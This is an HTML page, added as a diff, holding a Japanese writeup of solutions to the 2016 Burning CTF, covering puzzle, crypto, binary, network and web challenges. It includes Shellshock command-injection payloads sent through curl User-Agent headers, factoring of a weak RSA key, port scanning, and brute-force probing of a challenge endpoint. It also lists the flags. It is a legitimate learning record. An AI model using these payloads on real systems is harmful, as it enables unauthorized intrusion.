@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="generator" content="pandoc">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Mon Feb 8 00:39:25 JST 2016</title>
+  <style type="text/css">code{white-space: pre;}</style>
+  <style type="text/css">
+div.sourceCode { overflow-x: auto; }
+table.sourceCode, tr.sourceCode, td.lineNumbers, td.sourceCode {
+  margin: 0; padding: 0; vertical-align: baseline; border: none; }
+table.sourceCode { width: 100%; line-height: 100%; }
+td.lineNumbers { text-align: right; padding-right: 4px; padding-left: 4px; color: #aaaaaa; border-right: 1px solid #aaaaaa; }
+td.sourceCode { padding-left: 5px; }
+code > span.kw { color: #007020; font-weight: bold; } /* Keyword */
+code > span.dt { color: #902000; } /* DataType */
+code > span.dv { color: #40a070; } /* DecVal */
+code > span.bn { color: #40a070; } /* BaseN */
+code > span.fl { color: #40a070; } /* Float */
+code > span.ch { color: #4070a0; } /* Char */
+code > span.st { color: #4070a0; } /* String */
+code > span.co { color: #60a0b0; font-style: italic; } /* Comment */
+code > span.ot { color: #007020; } /* Other */
+code > span.al { color: #ff0000; font-weight: bold; } /* Alert */
+code > span.fu { color: #06287e; } /* Function */
+code > span.er { color: #ff0000; font-weight: bold; } /* Error */
+code > span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+code > span.cn { color: #880000; } /* Constant */
+code > span.sc { color: #4070a0; } /* SpecialChar */
+code > span.vs { color: #4070a0; } /* VerbatimString */
+code > span.ss { color: #bb6688; } /* SpecialString */
+code > span.im { } /* Import */
+code > span.va { color: #19177c; } /* Variable */
+code > span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+code > span.op { color: #666666; } /* Operator */
+code > span.bu { } /* BuiltIn */
+code > span.ex { } /* Extension */
+code > span.pp { color: #bc7a00; } /* Preprocessor */
+code > span.at { color: #7d9029; } /* Attribute */
+code > span.do { color: #ba2121; font-style: italic; } /* Documentation */
+code > span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+code > span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+code > span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+  </style>
+  <link rel="stylesheet" href="../../../resources/css/c.css">
+  <link rel="stylesheet" href="../../css/post.css">
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+</head>
+<body>
+<a href="../../">🔙 Back to Top</a>
+<header>
+<h1 class="title">Mon Feb 8 00:39:25 JST 2016</h1>
+</header>
+<h2 id="場阿忍愚-burning-ctf-writeup">場阿忍愚 (burning) CTF Writeup</h2>
+<p>http://burningctf.yamatosecurity.com/score/puzzle</p>
+<p>cympfh:yuyushiki</p>
+<p>メモとりながらやってたのでメモを晒します</p>
+<h1 id="練習">練習</h1>
+<p>画像を繋げる</p>
+<h1 id="芸術">芸術</h1>
+<h2 id="section">111</h2>
+<ol type="1">
+<li>篆書体っぽい
+<ul>
+<li>https://ja.wikipedia.org/wiki/%E7%AF%86%E6%9B%B8%E4%BD%93</li>
+<li>https://www.is-hanko.co.jp/shachi/tensho_check.html</li>
+</ul></li>
+<li>大木口 世幾由?伊 (セキュリティ)
+<ul>
+<li>木偏に口: http://glyphwiki.org/wiki/u2ac73</li>
+<li>ムク 大和、でした {大和セキュリティ}</li>
+</ul></li>
+</ol>
+<h2 id="section-1">112</h2>
+<p>勘</p>
+<h1 id="二進術">二進術</h1>
+<h2 id="section-2">121</h2>
+<div class="sourceCode"><pre class="sourceCode coffee"><code class="sourceCode coffee"><span class="kw">{</span>spawn<span class="kw">,</span> exec<span class="kw">}</span> <span class="kw">=</span> require <span class="st">&#39;child_process&#39;</span>
+
+child <span class="kw">=</span> spawn <span class="st">&#39;stdbuf&#39;</span><span class="kw">,</span> <span class="kw">[</span><span class="st">&#39;-o0&#39;</span><span class="kw">,</span> <span class="st">&#39;./121-calculation&#39;</span><span class="kw">]</span>
+child<span class="kw">.</span>stdout<span class="kw">.</span>setEncoding <span class="st">&#39;utf-8&#39;</span>
+
+child<span class="kw">.</span>stderr<span class="kw">.</span><span class="ot">on</span> <span class="st">&#39;data&#39;</span><span class="kw">,</span> <span class="fu">(data) -&gt;</span>
+  <span class="ot">console</span><span class="kw">.</span>warn <span class="st">&#39;stderr&#39;</span><span class="kw">,</span> data
+
+buf <span class="kw">=</span> <span class="st">&#39;&#39;</span>
+child<span class="kw">.</span>stdout<span class="kw">.</span><span class="ot">on</span> <span class="st">&#39;data&#39;</span><span class="kw">,</span> <span class="fu">(data) -&gt;</span>
+  <span class="ot">console</span><span class="kw">.</span>log <span class="st">&#39;stdout&#39;</span><span class="kw">,</span> data
+  buf <span class="kw">+=</span> data
+  <span class="kw">if</span> buf<span class="kw">.</span>indexOf<span class="kw">(</span><span class="st">&#39;=&#39;</span><span class="kw">)</span> <span class="kw">&gt;</span> <span class="kw">-</span><span class="dv">1</span>
+    x <span class="kw">=</span> <span class="ot">Math</span><span class="kw">.</span>floor <span class="ot">eval</span> buf<span class="kw">.</span>replace <span class="st">/=/g</span><span class="kw">,</span> <span class="st">&#39;&#39;</span>
+    child<span class="kw">.</span>stdin<span class="kw">.</span>write <span class="kw">(new</span> <span class="dt">Buffer</span><span class="kw">(</span><span class="st">&quot;</span><span class="ch">#{</span>x<span class="ch">}</span><span class="st">\n&quot;</span><span class="kw">))</span>
+    buf <span class="kw">=</span> <span class="st">&#39;&#39;</span></code></pre></div>
+<p>FLAG_5c33a1b8860e47da864714e042e13f1e</p>
+<h1 id="解読術">解読術</h1>
+<h2 id="section-3">131</h2>
+<p>神戸牛</p>
+<h2 id="section-4">132</h2>
+<p>http://saizou.makibisi.net/sinobi/iroha.html</p>
+<p>神代文字 (じんだいもじ) というやつで &quot;やまといえは&quot; とある. &quot;山と言えば？&quot; → &quot;川&quot;</p>
+<h2 id="section-5">133</h2>
+<p>秘密鍵と暗号化されたバイナリが渡されるから復号化せよというもの 原理的には素因数分解すればよい CTFだから、なんとか素因数分解が出来るものが渡されて、 適当なネットサービスを使えば実際にできる</p>
+<p><a href="https://0x90r00t.com/2015/09/20/ekoparty-pre-ctf-2015-cry100-rsa-2070-write-up/">[EKOPARTY PRE-CTF 2015] [Cry100 – RSA 2070] Write Up | 0x90r00t</a></p>
+<p>にある手順を真似た.</p>
+<pre><code>    openssl rsa -noout -text -inform PEM -in public-key.pem -pubin
+Public-Key: (640 bit)
+Modulus:
+    00:ae:5b:b4:f2:66:00:32:59:cf:9a:6f:52:1c:3c:
+    03:41:01:76:cf:16:df:53:95:34:76:ea:e3:b2:1e:
+    de:6c:3c:7b:03:bd:ca:20:b3:1c:00:67:ff:a7:97:
+    e4:e9:10:59:78:73:ee:f1:13:a6:0f:ec:cd:95:de:
+    b5:b2:bf:10:06:6b:e2:22:4a:ce:29:d5:32:dc:0b:
+    5a:74:d2:d0:06:f1
+Exponent: 65537 (0x10001)</code></pre>
+<p><code>Modulus</code> とあるものが、2つの素数の積. <code>:</code> で区切られているが、そのまま連結して16進数として読めばよい.</p>
+<p>10進数へ変換</p>
+<pre><code>   ruby -e &quot;p &#39;$(openssl rsa -noout -text -inform PEM -in public-key.pem -pubin | grep &#39;^ &#39; | tr -d &#39;:&#39; | tr -d &#39;\n&#39; | tr -d &#39; &#39;)&#39;.to_i 16&quot;
+3107418240490043721350750035888567930037346022842727545720161948823206440518081504556346829671723286782437916272838033415471073108501919548529007337724822783525742386454014691736602477652346609</code></pre>
+<p>これを素因数分解する. 先のwebページで使われてた通り <code>www.factordb.com</code> に投げてみた:</p>
+<p>http://www.factordb.com/index.php?query=3107418240490043721350750035888567930037346022842727545720161948823206440518081504556346829671723286782437916272838033415471073108501919548529007337724822783525742386454014691736602477652346609</p>
+<p>すると</p>
+<ul>
+<li>1634733645809253848443133883865090859841783670033092312181110852389333100104508151212118167511579</li>
+<li>1900871281664822113126851573935413975471896789968515493666638539088027103802104498957191261465571</li>
+</ul>
+<p>の積と判明. ここから秘密鍵を作る.</p>
+<pre><code>   wget https://raw.githubusercontent.com/ius/rsatool/master/rsatool.py
+   sudo apt-get install python-gmpy
+   ./rsatool.py -p 1634733645809253848443133883865090859841783670033092312181110852389333100104508151212118167511579 -q 1900871281664822113126851573935413975471896789968515493666638539088027103802104498957191261465571 -o private.pem</code></pre>
+<p>で、復号化</p>
+<pre><code>   openssl rsautl -decrypt -inkey private.pem -in flag.txt
+FLAG_IS_WeAK_rSA</code></pre>
+<h2 id="section-6">134</h2>
+<h1 id="攻撃術">攻撃術</h1>
+<h2 id="section-7">141</h2>
+<p>src: http://sprunge.us/ABKI</p>
+<div class="sourceCode"><pre class="sourceCode ruby"><code class="sourceCode ruby"><span class="co"># gen.rb</span>
+s = [
+  <span class="st">&#39;ls&#39;</span>, <span class="st">&#39;echo&#39;</span>, <span class="st">&#39;cat&#39;</span>,
+  <span class="st">&#39;0&#39;</span>, <span class="st">&#39;1&#39;</span>,
+  <span class="st">&#39;&gt;&#39;</span>, <span class="st">&#39;&lt;&#39;</span>
+]
+
+c = []
+n = <span class="dv">1</span> + rand(<span class="dv">100</span>)
+n.times {
+  c &lt;&lt; s[rand(s.length)]
+}
+puts c.join <span class="st">&#39; &#39;</span></code></pre></div>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="kw">(</span> <span class="kw">for</span> <span class="ex">i</span> in <span class="kw">`</span><span class="fu">seq</span> 1000<span class="kw">`;</span> <span class="kw">do</span> <span class="ex">ruby</span> gen.rb<span class="kw">;</span> <span class="kw">done</span>; <span class="bu">echo</span> exit <span class="kw">)</span> <span class="kw">|</span> <span class="ex">nc</span> 210.146.64.35 31337</code></pre></div>
+<p>なんかできた</p>
+<h2 id="section-8">142</h2>
+<p>src: http://sprunge.us/DWba 1. Yama 2. too</p>
+<p>ソースを読むとあと3つ必要. ところで Yama too は &quot;大和&quot; と読める.</p>
+<h1 id="解析術">解析術</h1>
+<h2 id="section-9">152</h2>
+<p>パケット見てるとPNGの文字列があったので、PNG画像自体がどこかにあると予想. 実際にひとつだけでかいパケットがある. その1つ前のパケットに、ヘッダの部分が紛れてるので連結しないとダメ. 実際にはその2つだけでは完全な画像は復元できなかったけど、 フラグを見るにはそれで十分.</p>
+<ol type="1">
+<li>Wireshark でパケットをバイナリとして保存
+<ul>
+<li>HTTPの場合はWiresharkのExport Object として直接ファイルを抽出できるらしい</li>
+</ul></li>
+<li>バイナリエディタでちょっと不要な箇所を削除
+<ul>
+<li>vimとxxdでやったけど普通のバイナリエディタが欲しい</li>
+</ul></li>
+<li>concat して画像ファイルとする</li>
+</ol>
+<h2 id="section-10">153</h2>
+<p>耳コピすると x5kpPQJU x5kpBQJU のあとに small って聞こえる</p>
+<h2 id="section-11">154</h2>
+<p>strings すると <code>removeme={U2FsdGVkX19DElLZ5iosaBUi9M5zUkEIeSRJkzkbf8XfGIuf2KvFOw71OJ0WmeJ0}</code> ってある.</p>
+<h2 id="section-12">155</h2>
+<h1 id="電網術">電網術</h1>
+<h2 id="section-13">161</h2>
+<p>FLAG.tar</p>
+<pre><code>0400   50 4b 03 04 0a 00 00 00 00 00 6e 8a 1a 47 03 d9  PK........n..G..
+0410   e4 2c 25 00 00 00 25 00 00 00 08 00 1c 00 66 6c  .,%...%.......fl
+0420   61 67 2e 74 78 74 55 54 09 00 03 1f f5 dd 55 24  ag.txtUT......U$
+0430   f5 dd 55 75 78 0b 00 01 04 f4 01 00 00 04 f4 01  ..Uux...........
+0440   00 00 52 6b 78 42 52 33 74 59 56 45 6c 75 57 44  ..RkxBR3tYVEluWD
+0450   59 35 62 6e 46 32 52 6d 46 76 52 58 64 33 54 6d  Y5bnF2RmFvRXd3Tm
+0460   4a 39 43 67 3d 3d 0a 50 4b 01 02 1e 03 0a 00 00  J9Cg==.PK.......</code></pre>
+<p>base64 としてデコードして FLAG{XTInX69nqvFaoEwwNb}</p>
+<h2 id="section-14">162</h2>
+<p>http://burning.nsc.gr.jp/ flag={BasicIsNotSecure}</p>
+<h2 id="section-15">164</h2>
+<p><code>nmap -vv -dd -Pn 210.146.64.34  -p 1-10000</code> めっちゃ時間かかった.</p>
+<p>5006番ポートが何に使われているのか調べてみたけれど、 wsm-server? とかいう意味不明なのが出てきただけだった.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash">   <span class="ex">nc</span> 210.146.64.34 5006
+<span class="op">&lt;</span><span class="ex">C-D-E-F-E-D-C---E-F-G-A-G-F-E---C-C-C-C-CCDDEEFFE-D-C-</span><span class="op">&gt;</span>what animal am i?the flag is the md5 hash of my name.%</code></pre></div>
+<p>カエルの歌</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash">   <span class="ex">md5sum</span><span class="op">&lt;&lt;&lt;</span><span class="st">&#39;frog&#39;</span>
+<span class="ex">0c304e0781f354e686b38b18647afc18</span>  -</code></pre></div>
+<p>は不正解. リダイレクトだと最後に改行が入るらしい</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash">   <span class="bu">echo</span> frog <span class="kw">|</span> <span class="fu">tr</span> -d <span class="st">&#39;\n&#39;</span> <span class="kw">|</span> <span class="ex">md5sum</span>
+<span class="ex">938c2cc0dcc05f2b68c4287040cfcf71</span>  -</code></pre></div>
+<h1 id="諜報術">諜報術</h1>
+<h2 id="section-16">173</h2>
+<p>images.google.com twanzphobic.wordpress.com</p>
+<h2 id="section-17">174</h2>
+<p>ヒントなしだとただのエスパー <code>curl http://...pdf | strings</code> で作者情報が偶然入ってた</p>
+<h1 id="記述術">記述術</h1>
+<h2 id="section-18">181</h2>
+<p>O(n^2) でやったけど3分で終わったしまあいっか。</p>
+<p><code>f_sz!bp_$gufl=b?za&gt;is#c|!?cxpr!i&gt;&lt;</code></p>
+<h2 id="section-19">182</h2>
+<p>初め 10! 全通り試そうとしてブラウザが死んだので真面目に解いた 知らん記法が明らかにあるけどそこは勘</p>
+<div class="sourceCode"><pre class="sourceCode javascript"><code class="sourceCode javascript">window[<span class="st">&quot;eval&quot;</span>][<span class="st">&quot;call&quot;</span>]<span class="vs">`</span><span class="sc">${</span>
+[ (<span class="bn">0O000101</span>)<span class="op">,</span> (0b1001100)<span class="op">,</span> (<span class="dv">101</span>)<span class="op">,</span> <span class="bn">0x52</span><span class="op">,</span> <span class="bn">0x54</span> ]
+[<span class="st">&quot;map&quot;</span>](x<span class="op">=&gt;</span>String[<span class="st">&quot;fromCodePoint&quot;</span>](x))[<span class="st">&quot;join&quot;</span>](<span class="st">&quot;&quot;</span>)[<span class="st">&quot;toLowerCase&quot;</span>]() <span class="op">+</span><span class="st">&quot;(1)&quot;</span>
+<span class="sc">}</span><span class="vs">`</span><span class="op">;</span></code></pre></div>
+<h2 id="section-20">183</h2>
+<p>1文字ずつを試すことで</p>
+<pre><code>member of &quot;a&quot; are 10
+member of &quot;b&quot; are 0
+member of &quot;c&quot; are 0
+member of &quot;d&quot; are 9
+member of &quot;e&quot; are 4
+member of &quot;f&quot; are 9
+member of &quot;g&quot; are 3
+member of &quot;h&quot; are 3
+member of &quot;i&quot; are 7
+member of &quot;j&quot; are 2
+member of &quot;k&quot; are 4
+member of &quot;l&quot; are 1
+member of &quot;m&quot; are 0
+member of &quot;n&quot; are 6
+member of &quot;o&quot; are 1
+member of &quot;p&quot; are 0
+member of &quot;q&quot; are 0
+member of &quot;r&quot; are 8
+member of &quot;s&quot; are 8
+member of &quot;t&quot; are 0
+member of &quot;u&quot; are 3
+member of &quot;v&quot; are 0
+member of &quot;w&quot; are 0
+member of &quot;x&quot; are 5
+member of &quot;y&quot; are 0
+member of &quot;z&quot; are 0
+member of &quot;_&quot; are 6
+member of &quot;{&quot; are 1
+member of &quot;}&quot; are 1</code></pre>
+<p><code>flag={X}</code> とするとXに使う文字は</p>
+<pre><code>{ a:9, d:9, e:4, f:8, g:2, h:3, i:7, j:2, k:4, n:6, o:1, r:8, s:8, u:3, x:5, _:6 }</code></pre>
+<p>4文字くらいをいきなり探す</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash">   <span class="kw">for</span> <span class="ex">a</span> in <span class="dt">{a,d,e,f,g,h,i,j,k,n,o,r,s,u,x}{a,d,e,f,g,h,i,j,k,n,o,r,s,u,x}{a,d,e,f,g,h,i,j,k,n,o,r,s,u,x}{a,d,e,f,g,h,i,j,k,n,o,r,s,u,x}</span><span class="kw">;</span> <span class="kw">do</span> <span class="ex">curl</span> -s  <span class="st">&quot;http://210.146.64.36:30840/count_number_of_flag_substring/?str=</span><span class="va">$a</span><span class="st">&amp;count=count&quot;</span> <span class="kw">|</span> <span class="fu">grep</span> member <span class="kw">|</span> <span class="fu">grep</span> -v <span class="st">&#39;are 0&#39;</span><span class="kw">;</span> <span class="kw">done</span>
+<span class="op">&lt;</span><span class="ex">p</span><span class="op">&gt;</span>member of <span class="kw">&amp;</span><span class="ex">quot</span><span class="kw">;</span><span class="ex">afiu</span><span class="kw">&amp;</span><span class="ex">quot</span><span class="kw">;</span> <span class="ex">are</span> <span class="op">1&lt;</span>/p<span class="op">&gt;</span>
+<span class="op">&lt;</span><span class="ex">p</span><span class="op">&gt;</span>member of <span class="kw">&amp;</span><span class="ex">quot</span><span class="kw">;</span><span class="ex">afsf</span><span class="kw">&amp;</span><span class="ex">quot</span><span class="kw">;</span> <span class="ex">are</span> <span class="op">1&lt;</span>/p<span class="op">&gt;</span></code></pre></div>
+<p>ここから</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="va">PHRASE=$(</span> <span class="kw">for</span> <span class="ex">a</span> in <span class="dt">{a,d,e,f,g,h,i,j,k,n,o,r,s,u,x,_}</span><span class="va">$PHRASE</span><span class="kw">;</span> <span class="kw">do</span> <span class="ex">curl</span> -s  <span class="st">&quot;http://210.146.64.36:30840/count_number_of_flag_substring/?str=</span><span class="va">$a</span><span class="st">&amp;count=count&quot;</span> <span class="kw">|</span> <span class="fu">grep</span> member <span class="kw">|</span> <span class="fu">grep</span> -v <span class="st">&#39;are 0&#39;</span> <span class="kw">|</span> <span class="fu">grep</span> -o <span class="st">&#39;;[^;]*&amp;&#39;</span> <span class="kw">|</span> <span class="fu">sed</span> <span class="st">&#39;s/^.\(.*\).$/\1/g&#39;</span><span class="kw">;</span> <span class="kw">done</span> <span class="kw">|</span> <span class="fu">head</span> -1 <span class="va">)</span>; <span class="bu">echo</span> <span class="va">$PHRASE</span></code></pre></div>
+<p>みたいにして1ずつ伸ばす</p>
+<p><code>afsfdsfdsfso_idardkxa_hgiahrei_nxnkasjdx_hfuidgire_anreiafn_dskafiudsurerfrandskjnxxr</code></p>
+<p><code>flag={}</code> は無くてよかった</p>
+<h2 id="section-21">184</h2>
+<p>何重にも圧縮されているので解凍しまくる:</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="kw">case</span> <span class="va">$(</span><span class="fu">file</span> a<span class="va">)</span><span class="kw"> in</span>
+  *bzip2* <span class="kw">)</span>
+    <span class="fu">mv</span> a flag.bz2
+    <span class="fu">bzip2</span> -d flag.bz2
+    <span class="fu">mv</span> flag a
+    <span class="kw">;;</span>
+  *tar* <span class="kw">)</span>
+    <span class="fu">mv</span> a flag.tar
+    <span class="fu">tar</span> xf flag.tar
+    <span class="fu">mv</span> flag.txt a
+    <span class="kw">;;</span>
+  *gzip* <span class="kw">)</span>
+    <span class="fu">mv</span> a flag.gz
+    <span class="fu">gunzip</span> -d flag.gz
+    <span class="fu">mv</span> flag a
+    <span class="kw">;;</span>
+  *Zip* <span class="kw">)</span>
+    <span class="fu">mv</span> a flag.zip
+    <span class="fu">unzip</span> flag.zip
+    <span class="fu">rm</span> flag.zip
+    <span class="fu">mv</span> flag.txt a
+    <span class="kw">;;</span>
+  * <span class="kw">)</span>
+    <span class="bu">echo</span> unknown: <span class="va">$(</span> <span class="fu">file</span> a <span class="va">)</span>
+    <span class="kw">;;</span>
+<span class="kw">esac</span></code></pre></div>
+<h1 id="超文書転送術">超文書転送術</h1>
+<h2 id="section-22">191</h2>
+<p>生成された画像が <code>http://210.146.64.47/movies/view/2827</code> みたいなurlで公開されてて <code>http://210.146.64.47/movies/view/1</code> ってやると一番初めに生成された画像が取れる. 一瞬だけフラグが表示される動画GIFであって、 フレームへの分解を <code>convert +adjoin 1 a.gif</code> ってやる.</p>
+<h2 id="section-23">192</h2>
+<p>&quot;About&quot; のページを見ると</p>
+<pre><code>Since 2000 we Have offered some Effective training courses , which cover network, Linux, web applications and related Licenses, to Students in worldwide. Hopefully Our services help you understand the Core Knowlegde of technologies.</code></pre>
+<p>ってあって、大文字だけ読むと <code>SHELLSHOCK</code> となる.</p>
+<pre><code>curl -v  -H &quot;User-Agent: () { :; }; /bin/ls&quot; &#39;http://210.146.64.37:60888/exec&#39; --data &#39;cmd=ss&amp;option=&#39;
+curl -v  -H &quot;User-Agent: () { :; }; /bin/cat flag.txt&quot; &#39;http://210.146.64.37:60888/exec&#39; --data &#39;cmd=ss&amp;option=&#39;</code></pre>
+<p>初め、 <code>curl -A</code> でやってたんだけどなんか上手く行かんかった 上のように <code>-H &quot;User-Agent:</code> で動いた.</p>
+<h1 id="兵法術">兵法術</h1>
+<p>普通の将棋みたいに、1マスをx座標、y座標で指定するのだが、 (x,y)を(x2,y2)に動かす時 <code>x y x2 y2</code> と記述してフラグにするみたい. 持ち駒を(x,y)に打つ場合は <code>x y</code>.</p>
+<h2 id="section-24">201</h2>
+<p><code>4769</code></p>
+<h2 id="section-25">202</h2>
+<ul>
+<li>左上: 5756 or 2635</li>
+<li>右上: 5756</li>
+<li>右下: 47</li>
+<li>左下: 4636</li>
+</ul>
+<p>右下だけ数字のインデクシングで4と7が入れ替わっていたのでそのように</p>
+<h2 id="section-26">203</h2>
+<p>2手詰め 5456 4645 5747成</p>
+<h2 id="section-27">204</h2>
+<p>3手詰め 2636-4656-7766成-5645-3635</p>
+</body>
+</html>
